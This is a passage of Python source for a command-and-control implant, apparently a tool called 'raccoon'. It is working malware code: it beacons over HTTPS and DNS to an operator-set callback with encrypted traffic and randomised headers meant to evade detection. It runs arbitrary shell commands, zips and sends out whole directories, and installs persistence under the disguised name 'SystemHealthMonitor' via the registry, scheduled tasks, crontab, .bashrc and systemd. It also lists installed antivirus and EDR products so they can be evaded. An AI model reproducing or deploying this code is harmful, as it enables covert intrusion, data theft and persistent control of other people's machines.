        "latency_ms": lambda: random.randint(1, 500),
        "uptime_hrs": lambda: round(random.uniform(0.1, 720), 1),
        "queue_depth": lambda: random.randint(0, 1000),
        "cache_hit_pct": lambda: round(random.uniform(50, 99.9), 1),
        "gc_pause_ms": lambda: round(random.uniform(0.1, 50), 2),
        "thread_count": lambda: random.randint(4, 128),
        "conn_pool_active": lambda: random.randint(1, 50),
        "batch_size": lambda: random.randint(10, 500),
    }
    keys = random.sample(list(pool.keys()), min(n, len(pool)))
    return {k: pool[k]() for k in keys}


class Beacon:
    """C2 beacon with AES-GCM encryption and network evasion."""

    def __init__(self, config: dict):
        c2 = config["c2"]
        self.interval = c2.get("beacon_interval_seconds", 300)
        self.jitter = c2.get("jitter_percent", 20) / 100.0

        https_cfg = c2.get("https", {})
        dns_cfg = c2.get("dns", {})

        self.https_enabled = https_cfg.get("enabled", False)
        self.callback_url = https_cfg.get("callback_url", "")
        self.verify_ssl = https_cfg.get("verify_ssl", False)

        self.dns_enabled = dns_cfg.get("enabled", False)
        self.dns_domain = dns_cfg.get("domain", "")
        self.dns_resolver = dns_cfg.get("resolver", "8.8.8.8")

        enc_key = c2.get("encryption_key", "")
        if enc_key:
            self._key = base64.b64decode(enc_key)
        else:
            seed = f"{self.callback_url}:{self.dns_domain}".encode()
            self._key = hashlib.sha256(seed).digest()

        proxy_cfg = c2.get("proxy", {})
        self.proxy_mode = proxy_cfg.get("mode", "auto")
        self.proxy_url = proxy_cfg.get("url", "")

        self._proxy = ProxyDiscovery()
        self._proxy_session: Optional[_HttpSession] = None

        self._implant_id = self._generate_id()
        self._agent_id: Optional[str] = None
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._registered = False
        self._consecutive_failures = 0

    # ── Identity ──

    def _generate_id(self) -> str:
        raw = f"{platform.node()}:{platform.machine()}"
        try:
            raw += f":{open('/sys/class/net/eth0/address').read().strip()}"
        except (FileNotFoundError, PermissionError):
            pass
        return hashlib.sha256(raw.encode()).hexdigest()[:16]

    # ── Crypto ──

    def _encrypt(self, data: dict) -> str:
        plaintext = json.dumps(data, separators=(",", ":")).encode()
        nonce = os.urandom(12)
        ct = _aes_gcm_encrypt(self._key, nonce, plaintext)
        return base64.b64encode(nonce + ct).decode()

    def _decrypt(self, b64: str) -> dict:
        raw = base64.b64decode(b64)
        nonce, ct = raw[:12], raw[12:]
        plaintext = _aes_gcm_decrypt(self._key, nonce, ct)
        return json.loads(plaintext)

    # ── Evasion helpers ──

    def _evasive_url(self, endpoint: str) -> str:
        base = self.callback_url.rsplit("/", 1)[0]
        suffix = random.choice(_URL_SUFFIXES)
        ts = int(time.time() * 1000)
        qp = f"?_t={ts}&sid={random.randint(10000, 99999)}"
        return f"{base}/{endpoint}{suffix}{qp}"

    def _evasive_headers(self) -> dict:
        headers = {
            "User-Agent": random.choice(_USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": random.choice(_ACCEPT_LANGUAGES),
            "Content-Type": "application/json",
        }
        extra_keys = random.sample(
            list(_EXTRA_HEADERS.keys()),
            random.randint(2, min(4, len(_EXTRA_HEADERS))),
        )
        for k in extra_keys:
            headers[k] = random.choice(_EXTRA_HEADERS[k])
        return headers

    def _wrap_payload(self, data: dict) -> dict:
        encrypted = self._encrypt(data)
        field = random.choice(_PAYLOAD_FIELDS)
        payload = {field: encrypted}
        payload.update(_decoy_fields(random.randint(4, 10)))
        return dict(sorted(payload.items()))

    def _unwrap_response(self, body: dict) -> Optional[dict]:
        for field in _PAYLOAD_FIELDS:
            if field in body:
                try:
                    return self._decrypt(body[field])
                except Exception:
                    continue
        for v in body.values():
            if isinstance(v, str) and len(v) > 32:
                try:
                    return self._decrypt(v)
                except Exception:
                    continue
        return None

    # ── System info ──

    def _system_info(self) -> dict:
        info = {
            "id": self._implant_id,
            "agent_id": self._agent_id,
            "hostname": platform.node(),
            "os": f"{platform.system()} {platform.release()}",
            "arch": platform.machine(),
            "pid": os.getpid(),
            "user": os.getenv("USER", os.getenv("USERNAME", "unknown")),
            "uptime": self._get_uptime(),
            "interval": self.interval,
            "local_ips": self._get_local_ips(),
            "proxy_mode": self.proxy_mode,
        }
        if self._proxy._active_proxy:
            info["proxy_active"] = self._proxy._active_proxy["url"]
        elif self._proxy_session and self._proxy_session.proxies:
            info["proxy_active"] = next(iter(self._proxy_session.proxies.values()), "none")
        return info

    @staticmethod
    def _get_local_ips() -> list:
        ips = []
        try:
            for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
                addr = info[4][0]
                if addr not in ips and addr != "127.0.0.1":
                    ips.append(addr)
        except Exception:
            pass
        if not ips:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ips.append(s.getsockname()[0])
                s.close()
            except Exception:
                pass
        return ips

    @staticmethod
    def _get_uptime() -> int:
        try:
            with open("/proc/uptime") as f:
                return int(float(f.read().split()[0]))
        except (FileNotFoundError, PermissionError):
            return 0

    # ── Timing ──

    def _jittered_sleep(self):
        offset = self.interval * self.jitter
        delay = self.interval + random.uniform(-offset, offset)
        time.sleep(max(10, delay))

    def _backoff_sleep(self):
        delay = min(5 * (1.5 ** self._consecutive_failures), 300)
        delay += random.uniform(0, delay * 0.2)
        logger.debug("Backoff %.1fs (failures=%d)", delay, self._consecutive_failures)
        time.sleep(delay)

    # ── HTTPS transport ──

    def _https_post(self, endpoint: str, data: dict) -> Optional[dict]:
        """POST encrypted payload via proxy-aware session; returns decrypted response or None."""
        session = self._proxy_session or _HttpSession()
        try:
            resp = session.post(
                self._evasive_url(endpoint),
                json_data=self._wrap_payload(data),
                headers=self._evasive_headers(),
                timeout=30,
            )
            if resp.status_code == 200:
                body = resp.json()
                result = self._unwrap_response(body)
                return result if result else {}
            if resp.status_code == 407:
                logger.warning("Proxy auth required (407) — set proxy credentials in URL")
        except _ProxyError as e:
            logger.debug("Proxy error on %s: %s — retrying direct", endpoint, e)
            try:
                direct = _HttpSession()
                direct.trust_env = False
                resp = direct.post(
                    self._evasive_url(endpoint),
                    json_data=self._wrap_payload(data),
                    headers=self._evasive_headers(),
                    timeout=30,
                )
                if resp.status_code == 200:
                    body = resp.json()
                    result = self._unwrap_response(body)
                    return result if result else {}
            except Exception:
                pass
        except Exception as e:
            logger.debug("HTTPS %s failed: %s", endpoint, e)
        return None

    def _register_https(self) -> bool:
        info = self._system_info()
        info["action"] = "register"
        result = self._https_post("register", info)
        if result is not None and result.get("success"):
            self._agent_id = result.get("agent_id", self._implant_id)
            self._registered = True
            logger.info("Registered as %s", self._agent_id)
            return True
        return False

    def _beacon_https(self) -> Optional[dict]:
        info = self._system_info()
        info["action"] = "beacon"
        return self._https_post("beacon", info)

    def _send_result_https(self, task_id: str, status: str, output: str,
                           data: Optional[dict] = None):
        result = {
            "action": "result",
            "agent_id": self._agent_id or self._implant_id,
            "task_id": task_id,
            "status": status,
            "output": output,
        }
        if data:
            result["data"] = data
        self._https_post("result", result)

    # ── DNS transport ──

    def _beacon_dns(self) -> Optional[dict]:
        try:
            agent = self._agent_id or self._implant_id
            encoded_id = base64.b32encode(agent.encode()).decode().rstrip("=").lower()
            query = f"{encoded_id}.b.{self.dns_domain}"

            results = _dns_query(query, "TXT", self.dns_resolver, timeout=10)
            for txt in results:
                try:
                    return self._decrypt(txt)
                except Exception:
                    try:
                        return json.loads(base64.b64decode(txt))
                    except Exception:
                        pass
        except Exception as e:
            logger.debug("DNS beacon failed: %s", e)
        return None

    # ── Command execution (pure Python for file ops, subprocess only for shell) ──

    def _exec_shell(self, cmd: str, timeout: int = 300) -> str:
        try:
            r = subprocess.run(
                cmd, shell=True,
                capture_output=True, text=True,
                timeout=timeout,
            )
            output = r.stdout
            if r.stderr:
                output += f"\n[stderr]\n{r.stderr}"
            if r.returncode != 0:
                output += f"\n[exit {r.returncode}]"
            return output[:65536]
        except subprocess.TimeoutExpired:
            return f"[timeout after {timeout}s]"
        except Exception as e:
            return f"[error: {e}]"

    def _exec_ls(self, path: str = ".") -> str:
        try:
            p = Path(path)
            if not p.exists():
                return f"ls: {path}: No such file or directory"
            lines = []
            for entry in sorted(p.iterdir()):
                try:
                    st = entry.stat()
                    mode = stat.filemode(st.st_mode)
                    size = st.st_size
                    mtime = time.strftime("%Y-%m-%d %H:%M", time.localtime(st.st_mtime))
                    lines.append(f"{mode} {size:>10} {mtime} {entry.name}")
                except OSError:
                    lines.append(f"?????????? ? {entry.name}")
            return "\n".join(lines) if lines else "(empty)"
        except Exception as e:
            return f"[error: {e}]"

    def _exec_lsjson(self, path: str = ".") -> str:
        try:
            p = Path(path)
            if not p.exists():
                return json.dumps({"error": f"{path}: No such file or directory"})
            entries = []
            for entry in sorted(p.iterdir()):
                try:
                    st = entry.stat()
                    info = {
                        "name": entry.name,
                        "path": str(entry.resolve()),
                        "is_dir": entry.is_dir(),
                        "is_link": entry.is_symlink(),
                        "size": st.st_size,
                        "mode": stat.filemode(st.st_mode),
                        "mtime": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_mtime)),
                        "atime": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_atime)),
                        "ctime": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_ctime)),
                    }
                    if entry.is_symlink():
                        try:
                            info["link_target"] = str(entry.resolve())
                        except Exception:
                            info["link_target"] = "?"
                    ext = entry.suffix.lower()
                    if entry.is_dir():
                        info["type"] = "directory"
                    elif ext in (".py", ".js", ".ts", ".sh", ".bash", ".ps1", ".rb", ".go",
                                 ".c", ".h", ".cpp", ".rs", ".java", ".cs", ".php", ".pl"):
                        info["type"] = "code"
                    elif ext in (".txt", ".md", ".rst", ".log", ".csv", ".json", ".xml",
                                 ".yaml", ".yml", ".toml", ".ini", ".cfg", ".conf"):
                        info["type"] = "text"
                    elif ext in (".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg", ".ico"):
                        info["type"] = "image"
                    elif ext in (".zip", ".tar", ".gz", ".bz2", ".xz", ".7z", ".rar"):
                        info["type"] = "archive"
                    elif ext in (".exe", ".dll", ".so", ".dylib", ".elf", ".bin"):
                        info["type"] = "binary"
                    elif ext in (".key", ".pem", ".crt", ".cer", ".p12", ".pfx", ".jks"):
                        info["type"] = "cert"
                    elif ext in (".db", ".sqlite", ".sqlite3", ".mdb"):
                        info["type"] = "database"
                    else:
                        info["type"] = "file"
                    try:
                        if platform.system() != "Windows":
                            import pwd
                            import grp
                            info["owner"] = pwd.getpwuid(st.st_uid).pw_name
                            info["group"] = grp.getgrgid(st.st_gid).gr_name
                        else:
                            info["owner"] = ""
                            info["group"] = ""
                    except Exception:
                        info["owner"] = str(st.st_uid) if hasattr(st, "st_uid") else ""
                        info["group"] = str(st.st_gid) if hasattr(st, "st_gid") else ""
                    entries.append(info)
                except OSError:
                    entries.append({"name": entry.name, "error": True})
            return json.dumps({"path": str(p.resolve()), "entries": entries,
                               "count": len(entries)})
        except Exception as e:
            return json.dumps({"error": str(e)})

    def _exec_cat(self, path: str) -> str:
        try:
            return Path(path).read_text(errors="replace")[:65536]
        except Exception as e:
            return f"[error: {e}]"

    def _exec_download(self, path: str) -> dict:
        try:
            data = Path(path).read_bytes()
            if len(data) > 10 * 1024 * 1024:
                return {"error": f"File too large ({len(data)} bytes, max 10MB)"}
            return {
                "filename": Path(path).name,
                "size": len(data),
                "data": base64.b64encode(data).decode(),
            }
        except Exception as e:
            return {"error": str(e)}

    def _exec_loot(self, path: str) -> dict:
        """Zip a directory recursively and return as downloadable data."""
        try:
            p = Path(path)
            if not p.exists():
                return {"error": f"{path}: No such file or directory"}
            if p.is_file():
                return self._exec_download(path)
            buf = io.BytesIO()
            file_count = 0
            max_size = 50 * 1024 * 1024
            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=6) as zf:
                for root, dirs, files in os.walk(str(p)):
                    for fn in files:
                        fp = Path(root) / fn
                        try:
                            arcname = str(fp.relative_to(p))
                            if fp.stat().st_size > max_size:
                                continue
                            zf.write(str(fp), arcname)
                            file_count += 1
                        except (PermissionError, OSError):
                            continue
                        if buf.tell() > max_size:
                            break
                    if buf.tell() > max_size:
                        break
            data = buf.getvalue()
            dirname = p.name or "root"
            filename = f"{dirname}.zip"
            return {
                "filename": filename,
                "size": len(data),
                "files": file_count,
                "data": base64.b64encode(data).decode(),
                "loot": True,
            }
        except Exception as e:
            return {"error": str(e)}

    def _exec_upload(self, path: str, data_b64: str) -> str:
        try:
            target = Path(path)
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(base64.b64decode(data_b64))
            return f"Uploaded {target} ({target.stat().st_size} bytes)"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_pwd() -> str:
        return os.getcwd()

    @staticmethod
    def _exec_cd(path: str) -> str:
        try:
            os.chdir(path)
            return os.getcwd()
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_cp(src: str, dst: str) -> str:
        try:
            if Path(src).is_dir():
                shutil.copytree(src, dst)
            else:
                shutil.copy2(src, dst)
            return f"Copied {src} -> {dst}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_mv(src: str, dst: str) -> str:
        try:
            shutil.move(src, dst)
            return f"Moved {src} -> {dst}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_rm(path: str) -> str:
        try:
            p = Path(path)
            if p.is_dir():
                shutil.rmtree(path)
            else:
                p.unlink()
            return f"Removed {path}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_mkdir(path: str) -> str:
        try:
            Path(path).mkdir(parents=True, exist_ok=True)
            return f"Created {path}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_chmod(mode: str, path: str) -> str:
        try:
            os.chmod(path, int(mode, 8))
            return f"chmod {mode} {path}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_write(path: str, content: str) -> str:
        try:
            target = Path(path)
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(content)
            return f"Wrote {len(content)} bytes to {path}"
        except Exception as e:
            return f"[error: {e}]"

    # ── Persistence ──

    def _get_beacon_path(self) -> str:
        return os.path.abspath(sys.argv[0])

    def _exec_persist(self, method: str) -> str:
        method = (method or "auto").strip().lower()
        beacon_path = self._get_beacon_path()
        python_path = sys.executable
        cmd_line = f"{python_path} {beacon_path}"

        if method == "auto":
            method = "registry" if platform.system() == "Windows" else "crontab"

        try:
            if method == "registry":
                if platform.system() != "Windows":
                    return "[error] Registry persistence only available on Windows"
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE,
                )
                winreg.SetValueEx(key, "SystemHealthMonitor", 0, winreg.REG_SZ, cmd_line)
                winreg.CloseKey(key)
                return f"Persistence installed: HKCU\\...\\Run\\SystemHealthMonitor\n{cmd_line}"

            elif method == "startup":
                if platform.system() != "Windows":
                    return "[error] Startup folder persistence only available on Windows"
                startup = Path(os.environ.get("APPDATA", "")) / \
                    r"Microsoft\Windows\Start Menu\Programs\Startup"
                lnk_vbs = startup / "SystemHealth.vbs"
                lnk_vbs.write_text(
                    f'CreateObject("WScript.Shell").Run "{cmd_line}", 0, False\n'
                )
                return f"Persistence installed: {lnk_vbs}"

            elif method == "schtask":
                if platform.system() != "Windows":
                    return "[error] Scheduled task persistence only available on Windows"
                result = subprocess.run(
                    ["schtasks", "/create", "/tn", "SystemHealthMonitor",
                     "/tr", cmd_line, "/sc", "onlogon", "/rl", "highest", "/f"],
                    capture_output=True, text=True, timeout=15,
                )
                if result.returncode == 0:
                    return f"Persistence installed: schtask SystemHealthMonitor\n{result.stdout.strip()}"
                return f"[error] {result.stderr.strip()}"

            elif method == "crontab":
                if platform.system() == "Windows":
                    return "[error] Crontab not available on Windows"
                existing = subprocess.run(
                    ["crontab", "-l"], capture_output=True, text=True, timeout=10,
                )
                lines = existing.stdout if existing.returncode == 0 else ""
                marker = "# raccoon-persist"
                if marker in lines:
                    return "Persistence already installed (crontab)"
                entry = f"@reboot {cmd_line} {marker}\n"
                new_cron = lines.rstrip("\n") + "\n" + entry
                proc = subprocess.run(
                    ["crontab", "-"], input=new_cron, capture_output=True, text=True, timeout=10,
                )
                if proc.returncode == 0:
                    return f"Persistence installed: crontab @reboot\n{cmd_line}"
                return f"[error] {proc.stderr.strip()}"

            elif method == "bashrc":
                if platform.system() == "Windows":
                    return "[error] bashrc not available on Windows"
                rc = Path.home() / ".bashrc"
                marker = "# raccoon-persist"
                content = rc.read_text() if rc.exists() else ""
                if marker in content:
                    return "Persistence already installed (.bashrc)"
                line = f"\n(nohup {cmd_line} &>/dev/null &) {marker}\n"
                rc.write_text(content + line)
                return f"Persistence installed: ~/.bashrc"

            elif method == "systemd":
                if platform.system() == "Windows":
                    return "[error] systemd not available on Windows"
                svc_dir = Path.home() / ".config" / "systemd" / "user"
                svc_dir.mkdir(parents=True, exist_ok=True)
                svc = svc_dir / "system-health.service"
                svc.write_text(
                    f"[Unit]\nDescription=System Health Monitor\n\n"
                    f"[Service]\nExecStart={cmd_line}\nRestart=always\n"
                    f"RestartSec=30\n\n[Install]\nWantedBy=default.target\n"
                )
                subprocess.run(
                    ["systemctl", "--user", "enable", "--now", "system-health"],
                    capture_output=True, text=True, timeout=15,
                )
                return f"Persistence installed: systemd user service\n{svc}"

            else:
                return f"[error] Unknown method: {method}\nAvailable: auto, registry, startup, schtask, crontab, bashrc, systemd"

        except Exception as e:
            return f"[error] {e}"

    def _exec_unpersist(self, method: str) -> str:
        method = (method or "auto").strip().lower()
        if method == "auto":
            method = "registry" if platform.system() == "Windows" else "crontab"

        try:
            if method == "registry":
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE,
                )
                try:
                    winreg.DeleteValue(key, "SystemHealthMonitor")
                except FileNotFoundError:
                    return "No registry persistence found"
                finally:
                    winreg.CloseKey(key)
                return "Registry persistence removed"

            elif method == "startup":
                lnk = Path(os.environ.get("APPDATA", "")) / \
                    r"Microsoft\Windows\Start Menu\Programs\Startup\SystemHealth.vbs"
                if lnk.exists():
                    lnk.unlink()
                    return f"Startup persistence removed: {lnk}"
                return "No startup persistence found"

            elif method == "schtask":
                result = subprocess.run(
                    ["schtasks", "/delete", "/tn", "SystemHealthMonitor", "/f"],
                    capture_output=True, text=True, timeout=15,
                )
                return result.stdout.strip() or result.stderr.strip() or "Scheduled task removed"

            elif method == "crontab":
                existing = subprocess.run(
                    ["crontab", "-l"], capture_output=True, text=True, timeout=10,
                )
                if existing.returncode != 0:
                    return "No crontab found"
                marker = "# raccoon-persist"
                lines = [l for l in existing.stdout.splitlines() if marker not in l]
                subprocess.run(
                    ["crontab", "-"], input="\n".join(lines) + "\n",
                    capture_output=True, text=True, timeout=10,
                )
                return "Crontab persistence removed"

            elif method == "bashrc":
                rc = Path.home() / ".bashrc"
                if not rc.exists():
                    return "No .bashrc found"
                marker = "# raccoon-persist"
                lines = [l for l in rc.read_text().splitlines() if marker not in l]
                rc.write_text("\n".join(lines) + "\n")
                return ".bashrc persistence removed"

            elif method == "systemd":
                subprocess.run(
                    ["systemctl", "--user", "disable", "--now", "system-health"],
                    capture_output=True, text=True, timeout=15,
                )
                svc = Path.home() / ".config" / "systemd" / "user" / "system-health.service"
                if svc.exists():
                    svc.unlink()
                return "Systemd persistence removed"

            else:
                return f"[error] Unknown method: {method}"

        except Exception as e:
            return f"[error] {e}"

    def _exec_proxyinfo(self) -> str:
        lines = [f"Proxy mode: {self.proxy_mode}"]
        if self.proxy_url:
            lines.append(f"Configured URL: {self.proxy_url}")
        lines.append("")
        lines.append(self._proxy.summary())
        if self._proxy_session and self._proxy_session.proxies:
            lines.append("")
            lines.append("Session proxies:")
            for scheme, url in self._proxy_session.proxies.items():
                lines.append(f"  {scheme}: {url}")
        return "\n".join(lines)

    # ── AV / EDR enumeration ──

    _AV_SERVICES_WIN = [
        ("WinDefend", "Windows Defender", "av"),
        ("Sense", "Defender for Endpoint (EDR)", "edr"),
        ("CbDefense", "Carbon Black Defense", "edr"),
        ("CbDefenseSensor", "Carbon Black Sensor", "edr"),
        ("CSFalconService", "CrowdStrike Falcon", "edr"),
        ("SentinelAgent", "SentinelOne", "edr"),
        ("SentinelStaticEngine", "SentinelOne Static", "edr"),
        ("cyabortsvc", "Cortex XDR", "edr"),
        ("CortexXDR", "Cortex XDR", "edr"),
        ("elastic-agent", "Elastic Agent", "edr"),
        ("elastic-endpoint", "Elastic Endpoint", "edr"),
        ("xagt", "Trellix/FireEye HX", "edr"),
        ("CylanceSvc", "Cylance", "edr"),
        ("TaniumClient", "Tanium", "edr"),
        ("QualysAgent", "Qualys Agent", "edr"),
        ("ir_agent", "Rapid7 InsightAgent", "edr"),
        ("AVP", "Kaspersky", "av"),
        ("klnagent", "Kaspersky Network Agent", "av"),
        ("EPSecurityService", "Bitdefender", "av"),
        ("BDAuxSrv", "Bitdefender Aux", "av"),
        ("SAVService", "Sophos AV", "edr"),
        ("SophosAgent", "Sophos Agent", "edr"),
        ("hmpalert", "Sophos Intercept X", "edr"),
        ("McShield", "McAfee/Trellix", "av"),
        ("masvc", "McAfee Agent", "av"),
        ("mfemms", "McAfee Management", "av"),
        ("ekrn", "ESET", "av"),
        ("AvastSvc", "Avast", "av"),
        ("avgnt", "AVG", "av"),
        ("fshoster", "WithSecure/F-Secure", "av"),
        ("ccSvcHst", "Symantec SEP", "av"),
        ("SepMasterService", "Symantec Master", "av"),
        ("SplunkForwarder", "Splunk Forwarder", "siem"),
        ("splunkd", "Splunk Daemon", "siem"),
        ("wazuh-agent", "Wazuh Agent", "siem"),
        ("OssecSvc", "OSSEC", "siem"),
        ("Sysmon", "Sysmon", "audit"),
        ("Sysmon64", "Sysmon x64", "audit"),
        ("osqueryd", "osquery", "audit"),
    ]

    _AV_PROCS_LINUX = [
        ("clamd", "ClamAV", "av"),
        ("freshclam", "ClamAV Updater", "av"),
        ("falcon-sensor", "CrowdStrike Falcon", "edr"),
        ("cbagentd", "Carbon Black", "edr"),
        ("SentinelAgent", "SentinelOne", "edr"),
        ("elastic-agent", "Elastic Agent", "edr"),
        ("elastic-endpoint", "Elastic Endpoint", "edr"),
        ("xagt", "Trellix/FireEye HX", "edr"),
        ("cortex-xdr", "Cortex XDR", "edr"),
        ("splunkd", "Splunk", "siem"),
        ("wazuh-agentd", "Wazuh", "siem"),
        ("ossec-agentd", "OSSEC", "siem"),
        ("ossec-syscheckd", "OSSEC Syscheck", "siem"),
        ("auditd", "Linux Audit", "audit"),
        ("osqueryd", "osquery", "audit"),
        ("snort", "Snort IDS", "ids"),
        ("suricata", "Suricata IDS", "ids"),
        ("velociraptor", "Velociraptor DFIR", "dfir"),
        ("grr_agent", "GRR Agent", "dfir"),
        ("savd", "Sophos AV", "edr"),
        ("SophosAgent", "Sophos Agent", "edr"),
    ]

    def _exec_avenum(self) -> str:
        """Enumerate AV/EDR/SIEM/audit tools on the system."""
        findings = []
        system = platform.system()

        if system == "Windows":
            # Check services via sc query
            for svc_name, display, cat in self._AV_SERVICES_WIN:
                try:
                    r = subprocess.run(
                        ["sc", "query", svc_name],
                        capture_output=True, text=True, timeout=5,
                    )
                    if r.returncode == 0 and "RUNNING" in r.stdout:
                        findings.append((display, cat, "running"))
                    elif r.returncode == 0 and "STOPPED" in r.stdout:
                        findings.append((display, cat, "stopped"))
                except Exception:
                    pass

            # WMI AntiVirusProduct (SecurityCenter2)
            try:
                r = subprocess.run(
                    ["powershell", "-NoProfile", "-Command",
                     "Get-CimInstance -Namespace root/SecurityCenter2 "
                     "-ClassName AntiVirusProduct | "
                     "Select-Object displayName,productState | "
                     "Format-List"],
                    capture_output=True, text=True, timeout=15,
                )
                if r.returncode == 0 and r.stdout.strip():
                    for block in r.stdout.split("\n\n"):
                        name = ""
                        state = ""
                        for line in block.splitlines():
                            if "displayName" in line:
                                name = line.split(":", 1)[-1].strip()
                            if "productState" in line:
                                state = line.split(":", 1)[-1].strip()
                        if name:
                            try:
                                ps = int(state)
                                enabled = bool((ps >> 12) & 1)
                                updated = not bool((ps >> 4) & 1)
                            except (ValueError, TypeError):
                                enabled, updated = None, None
                            status_parts = []
                            if enabled is True:
                                status_parts.append("enabled")
                            elif enabled is False:
                                status_parts.append("disabled")
                            if updated is True:
                                status_parts.append("up-to-date")
                            elif updated is False:
                                status_parts.append("outdated")
                            status_str = ", ".join(status_parts) if status_parts else "registered"
                            already = any(name.lower() in f[0].lower() for f in findings)
                            if not already:
                                findings.append((name, "av/wmi", status_str))
            except Exception:
                pass

            # Check Windows Firewall
            try:
                r = subprocess.run(
                    ["netsh", "advfirewall", "show", "allprofiles", "state"],
                    capture_output=True, text=True, timeout=10,
                )
                if r.returncode == 0:
                    on_count = r.stdout.lower().count("on")
                    off_count = r.stdout.lower().count("off")
                    findings.append(("Windows Firewall", "fw",
                                     f"{on_count} on / {off_count} off"))
            except Exception:
                pass

            # Check AMSI via registry
            try:
                r = subprocess.run(
                    ["reg", "query",
                     r"HKLM\SOFTWARE\Microsoft\AMSI\Providers"],
                    capture_output=True, text=True, timeout=5,
                )
                provider_count = sum(1 for l in r.stdout.splitlines()
                                     if l.strip().startswith("HKEY"))
                findings.append(("AMSI", "audit",
                                 f"{provider_count} providers"))
            except Exception:
                pass

            # Check AppLocker
            try:
                r = subprocess.run(
                    ["powershell", "-NoProfile", "-Command",
                     "(Get-AppLockerPolicy -Effective).RuleCollections.Count"],
                    capture_output=True, text=True, timeout=10,
                )
                if r.returncode == 0 and r.stdout.strip():
                    cnt = r.stdout.strip()
                    findings.append(("AppLocker", "policy",
                                     f"{cnt} rule collections"))
            except Exception:
                pass

        else:
            # Linux: check running processes
            try:
                r = subprocess.run(
                    ["ps", "axo", "comm"], capture_output=True,
                    text=True, timeout=10,
                )
                procs = set(r.stdout.strip().splitlines())
                for proc_name, display, cat in self._AV_PROCS_LINUX:
                    if proc_name in procs:
                        findings.append((display, cat, "running"))
            except Exception:
                pass

            # Check iptables rules count
            try:
                r = subprocess.run(
                    ["iptables", "-L", "-n", "--line-numbers"],
                    capture_output=True, text=True, timeout=10,
                )
                if r.returncode == 0:
                    rules = sum(1 for l in r.stdout.splitlines()
                                if l and not l.startswith("Chain")
                                and not l.startswith("num"))
                    findings.append(("iptables", "fw", f"{rules} rules"))
            except Exception:
                pass

            # Check SELinux
            try:
                r = subprocess.run(
                    ["getenforce"], capture_output=True, text=True, timeout=5,
                )
                if r.returncode == 0:
                    findings.append(("SELinux", "policy",
                                     r.stdout.strip().lower()))
            except Exception:
                pass

            # Check AppArmor
            try:
                aa = Path("/sys/kernel/security/apparmor/profiles")
                if aa.exists():
                    count = sum(1 for _ in aa.read_text().splitlines())
                    findings.append(("AppArmor", "policy",
                                     f"{count} profiles"))
            except Exception:
                pass

        if not findings:
            return "No AV/EDR/SIEM tools detected (limited enumeration)"

        lines = [f"{'Tool':<35} {'Category':<10} {'Status':<20}",
                 "-" * 65]
        for name, cat, status in findings:
            lines.append(f"{name:<35} {cat:<10} {status:<20}")
        lines.append(f"\n{len(findings)} security tool(s) detected on "
                      f"{platform.node()} ({system})")
        return "\n".join(lines)

    # ── ARP table ──

    _MAC_PREFIXES = {
        "00:50:56": "VMware", "00:0c:29": "VMware", "00:05:69": "VMware",
        "00:1c:14": "VMware", "00:15:5d": "Hyper-V", "08:00:27": "VirtualBox",
        "0a:00:27": "VirtualBox", "52:54:00": "QEMU/KVM",
        "b8:27:eb": "Raspberry Pi", "dc:a6:32": "Raspberry Pi",
        "e4:5f:01": "Raspberry Pi", "d8:3a:dd": "Raspberry Pi",
        "ac:de:48": "Apple", "00:1b:63": "Apple", "3c:22:fb": "Apple",
        "f8:ff:c2": "Apple",
        "00:1a:a0": "Dell", "f8:db:88": "Dell", "00:14:22": "Dell",
        "00:1e:c9": "Dell",
        "00:25:b5": "HP", "3c:d9:2b": "HP", "d4:c9:ef": "HP",
        "70:10:6f": "HP",
        "00:1c:c0": "Intel", "a4:bf:01": "Intel", "00:1b:21": "Intel",
        "f8:63:3f": "Intel",
        "00:04:4b": "Nvidia", "48:b0:2d": "Nvidia",
        "b4:2e:99": "Cisco", "00:1b:0d": "Cisco", "00:1e:14": "Cisco",
        "00:26:0b": "Cisco", "00:50:0f": "Cisco",
        "00:09:0f": "Fortinet", "00:60:b0": "Hewlett Packard",
        "f0:9f:c2": "Ubiquiti", "24:a4:3c": "Ubiquiti",
        "44:d9:e7": "Ubiquiti", "fc:ec:da": "Ubiquiti",
        "00:1a:2b": "Juniper", "00:05:85": "Juniper",
        "00:23:9c": "Juniper",
        "00:0d:b9": "PC Engines", "00:08:e3": "Huawei",
        "00:e0:fc": "Huawei", "48:46:fb": "Huawei",
        "08:00:20": "Sun/Oracle", "00:03:ba": "Sun/Oracle",
        "00:1d:09": "TP-Link", "50:c7:bf": "TP-Link",
        "ec:08:6b": "TP-Link",
        "a8:5e:45": "ASUS", "00:1a:92": "ASUS",
        "00:1f:1f": "ASUS",
        "bc:5f:f4": "ASRock", "d0:50:99": "ASRock",
        "00:0e:8f": "Netgear", "c0:ff:d4": "Netgear",
        "30:46:9a": "Netgear",
        "e0:91:f5": "Synology", "00:11:32": "Synology",
        "c4:3d:c7": "Netgear", "20:cf:30": "QNAP",
        "00:08:9b": "QNAP",
        "b0:be:76": "TP-Link", "14:cc:20": "TP-Link",
        "00:24:d4": "Freebox", "68:a3:78": "Freebox",
        "02:42": "Docker",
    }

    @classmethod
